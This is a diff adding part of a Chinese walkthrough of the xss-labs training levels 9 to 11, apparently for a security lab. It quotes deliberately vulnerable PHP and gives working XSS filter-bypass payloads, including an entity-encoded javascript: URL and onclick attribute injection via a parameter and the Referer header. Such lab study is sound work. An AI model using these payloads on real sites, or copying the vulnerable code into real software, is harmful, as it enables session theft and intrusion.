@@ -504,3 +504,130 @@ html实体编码在标签名/属性名里无效，但是在属性值里是可以
     46	</html>
 ```
 
+看到第32行有个判断条件判断 `$str7` 这个字符串里是否不包含 `http://`，而且17 - 23行又分别做了字符替换过滤。
+
+`payload`为`javascr&#105;pt:alert(1)//http://`
+
+那这里的话，是利用`//`去注释掉这个`http://`,同时将`i`进行html实体编码，来让代码执行。
+
+![image-20260915211929684](./../images/image-20260915211929684.png)
+
+添加链接后，点击这个友情链接，即可通关
+
+![image-20260915212011571](./../images/image-20260915212011571.png)
+
+## level10
+
+```php+HTML
+     1	<!DOCTYPE html><!--STATUS OK--><html>
+     2	<head>
+     3	<meta http-equiv="content-type" content="text/html;charset=utf-8">
+     4	<script>
+     5	window.alert = function()  
+     6	{     
+     7	confirm("完成的不错！");
+     8	 window.location.href="level11.php?keyword=good job!"; 
+     9	}
+    10	</script>
+    11	<title>欢迎来到level10</title>
+    12	</head>
+    13	<body>
+    14	<h1 align=center>欢迎来到level10</h1>
+    15	<?php 
+    16	ini_set("display_errors", 0);
+    17	$str = $_GET["keyword"];
+    18	$str11 = $_GET["t_sort"];
+    19	$str22=str_replace(">","",$str11);
+    20	$str33=str_replace("<","",$str22);
+    21	echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
+    22	<form id=search>
+    23	<input name="t_link"  value="'.'" type="hidden">
+    24	<input name="t_history"  value="'.'" type="hidden">
+    25	<input name="t_sort"  value="'.$str33.'" type="hidden">
+    26	</form>
+    27	</center>';
+    28	?>
+    29	<center><img src=level10.png></center>
+    30	<?php 
+    31	echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
+    32	?>
+    33	</body>
+    34	</html>
+```
+
+看到源码，25行存在`$str33`注入点，17-20行是对输入的替换过滤限制。仔细看其实第17行的`keyword`应该是用不太到，下面一行的`t_sort`才是真正的点。
+
+这里是只对尖括号`<`，`>`进行了限制，那么`on`一类的便可以使用了。
+
+`payload `= `t_sort=" onclick=alert(1) type="text`，`type=text`可以让隐藏的输入框显现出来。
+
+在url中键入`payload`后，点击输入框，即可通关
+
+![image-20260915212822796](./../images/image-20260915212822796.png)
+
+## level11
+
+```php+HTML
+     1	<!DOCTYPE html><!--STATUS OK--><html>
+     2	<head>
+     3	<meta http-equiv="content-type" content="text/html;charset=utf-8">
+     4	<script>
+     5	window.alert = function()  
+     6	{     
+     7	confirm("完成的不错！");
+     8	 window.location.href="level12.php?keyword=good job!"; 
+     9	}
+    10	</script>
+    11	<title>欢迎来到level11</title>
+    12	</head>
+    13	<body>
+    14	<h1 align=center>欢迎来到level11</h1>
+    15	<?php 
+    16	ini_set("display_errors", 0);
+    17	$str = $_GET["keyword"];
+    18	$str00 = $_GET["t_sort"];
+    19	$str11=$_SERVER['HTTP_REFERER'];
+    20	$str22=str_replace(">","",$str11);
+    21	$str33=str_replace("<","",$str22);
+    22	echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
+    23	<form id=search>
+    24	<input name="t_link"  value="'.'" type="hidden">
+    25	<input name="t_history"  value="'.'" type="hidden">
+    26	<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
+    27	<input name="t_ref"  value="'.$str33.'" type="hidden">
+    28	</form>
+    29	</center>';
+    30	?>
+    31	<center><img src=level11.png></center>
+    32	<?php 
+    33	echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
+    34	?>
+    35	</body>
+    36	</html>
+```
+
+注入点在27行处，传入参数应该是通过`Referer`这个报文头来传，用`hackbar`，`Burpsuite`等一下都可以来做。
+
+`Referer: " onclick=alert(1) type="text`
+
+```http
+GET /xss-labs/level11.php?keyword=111 HTTP/1.1
+Host: 192.168.17.144
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: " onclick=alert(1) type="text
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+```
+
+在`Burpsuite`上构造完后，`forward`一下，打开浏览器，点击一下出现的输入框
+
+![image-20260915214942705](./../images/image-20260915214942705.png)
+
+## level12
+
+
+
